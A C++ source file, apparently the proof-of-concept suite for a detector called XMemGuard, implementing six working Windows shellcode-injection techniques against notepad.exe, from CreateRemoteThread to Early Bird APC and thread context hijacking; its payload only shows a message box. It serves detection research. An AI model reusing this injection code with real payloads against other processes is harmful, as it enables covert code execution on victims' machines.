// Self-implemented PoCs for XMemGuard.
// Menu cases 1-6 cover the six self-implemented entries in the paper.
// See ../docs/POCS.md for the correspondence table and method descriptions.
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <vector>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")

// ============================================================================
// NT 状态码定义
// ============================================================================
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0x00000000
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// ============================================================================
// 基准 Shellcode
// ============================================================================
const unsigned char kShellcode[] = {
    0x4D, 0x33, 0xC9,       // xor r9, r9         ; uType = MB_OK
    0x48, 0x8B, 0x01,       // mov rax, [rcx]     ; MessageBoxA地址
    0x48, 0x8B, 0x51, 0x08, // mov rdx, [rcx+8]   ; message
    0x4C, 0x8B, 0x41, 0x10, // mov r8, [rcx+10h]  ; title
    0x48, 0x33, 0xC9,       // xor rcx, rcx       ; hWnd = NULL
    0x48, 0x83, 0xEC, 0x28, // sub rsp, 28h       ; 阴影空间和对齐
    0xFF, 0xD0,             // call rax
    0x48, 0x83, 0xC4, 0x28, // add rsp, 28h
    0xC3                    // ret
};

#pragma pack(push, 1)
struct InjectData {
    FARPROC pMessageBoxA;      // 8字节
    const char* message;       // 8字节
    const char* title;         // 8字节
};
#pragma pack(pop)

// ============================================================================
// Native API 函数指针
// ============================================================================
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    SIZE_T StackReserve,
    SIZE_T StackCommit,
    PVOID StartAddress,
    PVOID Parameter,
    PHANDLE ThreadHandle,
    PVOID ClientId
);

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

// 全局变量
pNtCreateThreadEx g_NtCreateThreadEx = nullptr;
pRtlCreateUserThread g_RtlCreateUserThread = nullptr;
pNtQueueApcThread g_NtQueueApcThread = nullptr;

// ============================================================================
// 辅助函数声明
// ============================================================================
BOOL EnableDebugPrivilege();
DWORD FindNotepadProcess();
HANDLE OpenProcessWithRetry(DWORD pid);
HMODULE FindModuleInProcess(HANDLE hProcess, const char* moduleName);
bool InitializeNativeAPI();
std::vector<DWORD> EnumerateThreads(DWORD pid);

// ============================================================================
// 初始化 Native API
// ============================================================================
bool InitializeNativeAPI() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        printf("[-] 无法获取 ntdll.dll 句柄\n");
        return false;
    }

    g_NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    g_RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
    g_NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");

    if (!g_NtCreateThreadEx || !g_RtlCreateUserThread || !g_NtQueueApcThread) {
        printf("[-] 无法解析一个或多个 Native API 函数\n");
        return false;
    }

    printf("[+] Native API 初始化成功\n");
    return true;
}

// ============================================================================
// 核心注入准备函数
// ============================================================================
struct InjectionContext {
    HANDLE hProcess;
    LPVOID pShellRemote;
    LPVOID pDataRemote;
    LPVOID pTitleRemote;
    LPVOID pMessageRemote;
    FARPROC remoteMsgBox;
};

bool PrepareInjectionContext(DWORD pid, InjectionContext* ctx) {
    memset(ctx, 0, sizeof(InjectionContext));

    ctx->hProcess = OpenProcessWithRetry(pid);
    if (!ctx->hProcess) {
        printf("[-] 无法打开进程 PID %lu (Error: 0x%lX)\n", pid, GetLastError());
        return false;
    }

    // === 确保 user32.dll 已加载 ===
    HMODULE hUser32Remote = FindModuleInProcess(ctx->hProcess, "user32.dll");
    if (!hUser32Remote) {
        printf("[*] 目标进程未加载 user32.dll，正在强制加载...\n");
        
        LPVOID pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        char szUser32Path[MAX_PATH];
        GetSystemDirectoryA(szUser32Path, MAX_PATH);
        strcat_s(szUser32Path, "\\user32.dll");
        
        LPVOID pDllPathRemote = VirtualAllocEx(ctx->hProcess, nullptr, strlen(szUser32Path) + 1,
                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pDllPathRemote) {
            printf("[-] 分配 DLL 路径内存失败\n");
            CloseHandle(ctx->hProcess);
            return false;
        }
        
        WriteProcessMemory(ctx->hProcess, pDllPathRemote, szUser32Path, strlen(szUser32Path) + 1, nullptr);
        HANDLE hLoadThread = CreateRemoteThread(ctx->hProcess, nullptr, 0,
            (LPTHREAD_START_ROUTINE)pLoadLibrary, pDllPathRemote, 0, nullptr);
        
        if (hLoadThread) {
            WaitForSingleObject(hLoadThread, INFINITE);
            CloseHandle(hLoadThread);
            hUser32Remote = FindModuleInProcess(ctx->hProcess, "user32.dll");
        }
        
        VirtualFreeEx(ctx->hProcess, pDllPathRemote, 0, MEM_RELEASE);
        
        if (!hUser32Remote) {
            printf("[-] 加载 user32.dll 失败\n");
            CloseHandle(ctx->hProcess);
            return false;
        }
    }
    printf("[+] user32.dll 基址: 0x%p\n", hUser32Remote);

    // === 计算 MessageBoxA 地址 ===
    HMODULE hUser32Local = GetModuleHandleA("user32.dll");
    if (!hUser32Local) {
        printf("[-] 本地获取 user32.dll 失败\n");
        CloseHandle(ctx->hProcess);
        return false;
    }

    FARPROC localMsgBox = GetProcAddress(hUser32Local, "MessageBoxA");
    if (!localMsgBox) {
        printf("[-] 本地获取 MessageBoxA 地址失败\n");
        CloseHandle(ctx->hProcess);
        return false;
    }

    DWORD_PTR addressOffset = (DWORD_PTR)localMsgBox - (DWORD_PTR)hUser32Local;
    ctx->remoteMsgBox = (FARPROC)((DWORD_PTR)hUser32Remote + addressOffset);
    printf("[+] MessageBoxA: 本地=0x%p, 远程=0x%p\n", localMsgBox, ctx->remoteMsgBox);

    // === 分配内存 ===
    ctx->pShellRemote = VirtualAllocEx(ctx->hProcess, nullptr, sizeof(kShellcode),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ctx->pDataRemote = VirtualAllocEx(ctx->hProcess, nullptr, sizeof(InjectData),
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ctx->pTitleRemote = VirtualAllocEx(ctx->hProcess, nullptr, 256,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ctx->pMessageRemote = VirtualAllocEx(ctx->hProcess, nullptr, 256,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!ctx->pShellRemote || !ctx->pDataRemote || !ctx->pTitleRemote || !ctx->pMessageRemote) {
        printf("[-] 内存分配失败\n");
        CloseHandle(ctx->hProcess);
        return false;
    }
    printf("[+] 内存分配成功: Shellcode=0x%p, Data=0x%p\n", ctx->pShellRemote, ctx->pDataRemote);

    // === 写入数据 ===
    const char kTitle[] = "检测警告";
    const char kMessage[] = "进程已被注入攻击！";
    
    WriteProcessMemory(ctx->hProcess, ctx->pTitleRemote, kTitle, sizeof(kTitle), nullptr);
    WriteProcessMemory(ctx->hProcess, ctx->pMessageRemote, kMessage, sizeof(kMessage), nullptr);

    InjectData localData;
    localData.pMessageBoxA = ctx->remoteMsgBox;
    localData.title = static_cast<const char*>(ctx->pTitleRemote);
    localData.message = static_cast<const char*>(ctx->pMessageRemote);
    
    WriteProcessMemory(ctx->hProcess, ctx->pDataRemote, &localData, sizeof(InjectData), nullptr);
    WriteProcessMemory(ctx->hProcess, ctx->pShellRemote, kShellcode, sizeof(kShellcode), nullptr);
    FlushInstructionCache(ctx->hProcess, ctx->pShellRemote, sizeof(kShellcode));

    return true;
}

void CleanupContext(InjectionContext* ctx) {
    if (ctx->hProcess) {
        if (ctx->pShellRemote) VirtualFreeEx(ctx->hProcess, ctx->pShellRemote, 0, MEM_RELEASE);
        if (ctx->pDataRemote) VirtualFreeEx(ctx->hProcess, ctx->pDataRemote, 0, MEM_RELEASE);
        if (ctx->pTitleRemote) VirtualFreeEx(ctx->hProcess, ctx->pTitleRemote, 0, MEM_RELEASE);
        if (ctx->pMessageRemote) VirtualFreeEx(ctx->hProcess, ctx->pMessageRemote, 0, MEM_RELEASE);
        CloseHandle(ctx->hProcess);
    }
}

// ============================================================================
// 注入方法实现
// ============================================================================

void Test_RemoteThread_Win32() {
    printf("\n========================================\n");
    printf("Method 1: CreateRemoteThread (Win32)\n");
    printf("========================================\n");

    DWORD pid = FindNotepadProcess();
    if (pid == 0) {
        printf("[-] 找不到 notepad.exe 进程\n");
        return;
    }

    InjectionContext ctx;
    if (!PrepareInjectionContext(pid, &ctx)) return;

    HANDLE hThread = CreateRemoteThread(ctx.hProcess, nullptr, 0,
        (LPTHREAD_START_ROUTINE)ctx.pShellRemote, ctx.pDataRemote, 0, nullptr);

    if (hThread) {
        printf("[+] 远程线程已创建，等待执行...\n");
        WaitForSingleObject(hThread, INFINITE);
        
        DWORD exitCode;
        if (GetExitCodeThread(hThread, &exitCode)) {
            printf("[+] 线程退出代码: %lu\n", exitCode);
        }
        CloseHandle(hThread);
    } else {
        printf("[-] CreateRemoteThread 失败: 0x%lX\n", GetLastError());
    }

    CleanupContext(&ctx);
}

void Test_RemoteThread_Native() {
    printf("\n========================================\n");
    printf("Method 2: NtCreateThreadEx (Native)\n");
    printf("========================================\n");

    DWORD pid = FindNotepadProcess();
    if (pid == 0) return;

    InjectionContext ctx;
    if (!PrepareInjectionContext(pid, &ctx)) return;

    HANDLE hThread = nullptr;
    NTSTATUS status = g_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr,
        ctx.hProcess, ctx.pShellRemote, ctx.pDataRemote, 0, 0, 0, 0, nullptr);

    if (NT_SUCCESS(status) && hThread) {
        printf("[+] NtCreateThreadEx 成功，等待执行...\n");
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    } else {
        printf("[-] NtCreateThreadEx 失败: 0x%08X\n", status);
    }

    CleanupContext(&ctx);
}

void Test_RtlCreateUserThread() {
    printf("\n========================================\n");
    printf("Method 3: RtlCreateUserThread\n");
    printf("========================================\n");

    DWORD pid = FindNotepadProcess();
    if (pid == 0) return;

    InjectionContext ctx;
    if (!PrepareInjectionContext(pid, &ctx)) return;

    HANDLE hThread = nullptr;
    NTSTATUS status = g_RtlCreateUserThread(ctx.hProcess, nullptr, FALSE, 0, 0, 0,
        ctx.pShellRemote, ctx.pDataRemote, &hThread, nullptr);

    if (NT_SUCCESS(status) && hThread) {
        printf("[+] RtlCreateUserThread 成功\n");
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    } else {
        printf("[-] RtlCreateUserThread 失败: 0x%08X\n", status);
    }

    CleanupContext(&ctx);
}

// Runtime APC：在现有目标进程中新建挂起线程，入队 APC 后恢复线程。
void Test_APC_Runtime() {
    printf("\n========================================\n");
    printf("Method 4: Runtime APC (new suspended thread in existing process)\n");
    printf("========================================\n");

    DWORD pid = FindNotepadProcess();
    if (pid == 0) return;

    InjectionContext ctx;
    if (!PrepareInjectionContext(pid, &ctx)) return;

    // 1. 获取一个无害的函数作为线程入口 (例如 kernel32!ExitThread 或 ntdll!RtlExitUserThread)
    // 这样 APC 执行完后，线程直接退出，不会有副作用。
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");

    // 2. 创建挂起线程
    HANDLE hThread = CreateRemoteThread(ctx.hProcess, nullptr, 0,
        (LPTHREAD_START_ROUTINE)pExitThread, 
        (LPVOID)0, // ExitCode = 0
        CREATE_SUSPENDED, nullptr);

    if (!hThread) {
        printf("[-] CreateRemoteThread Failed\n");
        CleanupContext(&ctx);
        return;
    }

    // 3. 入队 APC (Shellcode)
    // 关键：APC 会在线程恢复后，但在 ExitThread 执行前 运行。
    if (g_NtQueueApcThread(hThread, ctx.pShellRemote, ctx.pDataRemote, nullptr, nullptr) != STATUS_SUCCESS) {
        printf("[-] NtQueueApcThread Failed\n");
        TerminateThread(hThread, 0);
        CleanupContext(&ctx);
        return;
    }

    printf("[+] APC Queued. Resuming thread...\n");

    // 4. 恢复线程
    // 流程：Resume -> LdrInitializeThunk -> NtTestAlert -> KiUserApcDispatcher -> Shellcode -> ExitThread
    ResumeThread(hThread);

    // 等待 APC 执行完成 (Shellcode 弹窗后需要用户点击 OK，线程才会继续并退出)
    WaitForSingleObject(hThread, INFINITE);
    
    printf("[+] APC executed and thread exited normally.\n");

    CloseHandle(hThread);
    CleanupContext(&ctx);
}
void Test_EarlyBird() {
    printf("\n========================================\n");
    printf("Method 5: APC Early Bird Injection (new suspended process)\n");
    printf("特点：对新创建的挂起进程的主线程注入\n");
    printf("========================================\n");

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // 关键：CREATE_SUSPENDED
    if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", nullptr, nullptr, nullptr,
                        FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        printf("[-] 创建挂起进程失败\n");
        return;
    }
    
    printf("[+] 新进程已创建 (PID: %lu, 挂起状态)\n", pi.dwProcessId);
    printf("[+] 目标：主线程 (TID: %lu)\n", pi.dwThreadId);

    InjectionContext ctx;
    ctx.hProcess = pi.hProcess;
    
    if (!PrepareInjectionContext(pi.dwProcessId, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    // 向主线程插入 APC
    if (QueueUserAPC((PAPCFUNC)ctx.pShellRemote, pi.hThread, (ULONG_PTR)ctx.pDataRemote)) {
        printf("[+] APC 已入队到主线程（进程尚未开始执行）\n");
        printf("[!] 恢复主线程，触发 Early Bird 执行...\n");
        ResumeThread(pi.hThread);
        Sleep(5000);
    } else {
        printf("[-] QueueUserAPC 失败\n");
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
void Test_Context_Hijack() {
    printf("\n========================================\n");
    printf("Method 6: Thread Context Hijacking\n");
    printf("========================================\n");

    DWORD pid = FindNotepadProcess();
    if (pid == 0) {
        printf("[-] 找不到 notepad.exe 进程\n");
        return;
    }

    InjectionContext ctx;
    if (!PrepareInjectionContext(pid, &ctx)) return;

    std::vector<DWORD> threads = EnumerateThreads(pid);
    if (threads.empty()) {
        printf("[-] 目标进程无可用线程\n");
        CleanupContext(&ctx);
        return;
    }

    DWORD targetTid = threads[0];
    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, targetTid);
    if (!hThread) {
        printf("[-] 无法打开线程 TID %lu (Error: 0x%lX)\n", targetTid, GetLastError());
        CleanupContext(&ctx);
        return;
    }

    printf("[+] 目标线程: TID %lu\n", targetTid);

    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[-] SuspendThread 失败: 0x%lX\n", GetLastError());
        CloseHandle(hThread);
        CleanupContext(&ctx);
        return;
    }

    CONTEXT threadCtx = {};
    threadCtx.ContextFlags = CONTEXT_FULL;
    
    if (GetThreadContext(hThread, &threadCtx)) {
        printf("[+] 原始 RIP: 0x%llX\n", threadCtx.Rip);
        threadCtx.Rip = (DWORD64)ctx.pShellRemote;
        threadCtx.Rcx = (DWORD64)ctx.pDataRemote;  // 设置参数
        printf("[+] 劫持 RIP: 0x%llX\n", threadCtx.Rip);
        
        if (SetThreadContext(hThread, &threadCtx)) {
            printf("[+] 上下文已修改，恢复线程...\n");
            ResumeThread(hThread);
            Sleep(10000); // 等待执行
        } else {
            printf("[-] SetThreadContext 失败: 0x%lX\n", GetLastError());
            ResumeThread(hThread);
        }
    } else {
        printf("[-] GetThreadContext 失败: 0x%lX\n", GetLastError());
        ResumeThread(hThread);
    }

    CloseHandle(hThread);
    CleanupContext(&ctx);
}

// ============================================================================
// 辅助函数实现
// ============================================================================

HMODULE FindModuleInProcess(HANDLE hProcess, const char* moduleName) {
    HMODULE hMods[1024];
    DWORD cbNeeded;
    
    char targetName[_MAX_FNAME] = {0};
    strncpy_s(targetName, _countof(targetName), moduleName, _TRUNCATE);
    _strupr_s(targetName);
    
    if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        return NULL;
    }
    
    DWORD moduleCount = cbNeeded / sizeof(HMODULE);
    
    for (DWORD i = 0; i < moduleCount; i++) {
        char modName[MAX_PATH];
        if (GetModuleFileNameExA(hProcess, hMods[i], modName, sizeof(modName))) {
            char* fileName = PathFindFileNameA(modName);
            char currentName[_MAX_FNAME] = {0};
            strncpy_s(currentName, _countof(currentName), fileName, _TRUNCATE);
            _strupr_s(currentName);
            
            if (strcmp(currentName, targetName) == 0) {
                return hMods[i];
            }
        }
    }
    
    return NULL;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    return err == ERROR_SUCCESS;
}

DWORD FindNotepadProcess() {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            char* fileName = PathFindFileNameA(pe32.szExeFile);
            if (_stricmp(fileName, "notepad.exe") == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    CloseHandle(hProcess);
                    pid = pe32.th32ProcessID;
                    break;
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return pid;
}

HANDLE OpenProcessWithRetry(DWORD pid) {
    HANDLE hProcess = NULL;
    int retryCount = 3;
    
    while (retryCount-- > 0) {
        hProcess = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | 
            PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME,
            FALSE, pid
        );
        
        if (hProcess) break;
        
        if (GetLastError() == ERROR_ACCESS_DENIED) {
            Sleep(1000);
        } else {
            break;
        }
    }
    
    return hProcess;
}

std::vector<DWORD> EnumerateThreads(DWORD pid) {
    std::vector<DWORD> threads;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return threads;

    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                threads.push_back(te.th32ThreadID);
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return threads;
}

// ============================================================================
// 主菜单
// ============================================================================
void PrintMenu() {
    printf("\n╔═══════════════════════════════════════════════╗\n");
    printf("║  Shellcode 注入基准测试套件                  ║\n");
    printf("║  请先手动启动 notepad.exe                    ║\n");
    printf("╚═══════════════════════════════════════════════╝\n\n");
    printf("  [1] CreateRemoteThread (Win32)\n");
    printf("  [2] NtCreateThreadEx (Native)\n");
    printf("  [3] RtlCreateUserThread\n");
    printf("  [4] Runtime APC (new suspended thread in existing process)\n");
    printf("  [5] EarlyBird APC (new suspended process)\n");
    printf("  [6] Thread Context Hijacking\n");
    printf("  [0] 退出\n\n");
    printf("选择方法: ");
}

int main() {
    printf("╔═══════════════════════════════════════════════════════════╗\n");
    printf("║  Shellcode Injection Ground Truth Benchmark Suite        ║\n");
    printf("║  XMemGuard                                              ║\n");
    printf("╚═══════════════════════════════════════════════════════════╝\n\n");

    if (!EnableDebugPrivilege()) {
        printf("[-] 启用调试特权失败 (需要管理员权限)\n");
        printf("[!] 请以管理员身份运行此程序\n");
        system("pause");
        return 1;
    }
    printf("[+] 调试特权已启用\n");

    if (!InitializeNativeAPI()) {
        printf("[-] Native API 初始化失败\n");
        system("pause");
        return 1;
    }

    printf("\n[*] 准备工作:\n");
    printf("    1. 请手动启动 notepad.exe (记事本)\n");
    printf("    2. 确保 XMemGuard 已运行\n");
    printf("    3. 准备好日志收集工具\n\n");
    
    printf("[!] 按任意键继续...");
    system("pause >nul");

    while (true) {
        PrintMenu();
        
        int choice = 0;
        if (scanf_s("%d", &choice) != 1) {
            while (getchar() != '\n');
            printf("[-] 无效输入\n");
            continue;
        }

        switch (choice) {
        case 1: Test_RemoteThread_Win32(); break;
        case 2: Test_RemoteThread_Native(); break;
        case 3: Test_RtlCreateUserThread(); break;
        case 4: Test_APC_Runtime(); break;
        case 5: Test_EarlyBird(); break;
        case 6: Test_Context_Hijack(); break;
        case 0:
            printf("\n[*] 退出中...\n");
            return 0;
        default:
            printf("[-] 无效选择\n");
        }

        printf("\n[*] 按 Enter 继续...");
        while (getchar() != '\n');
        getchar();
    }

    return 0;
}
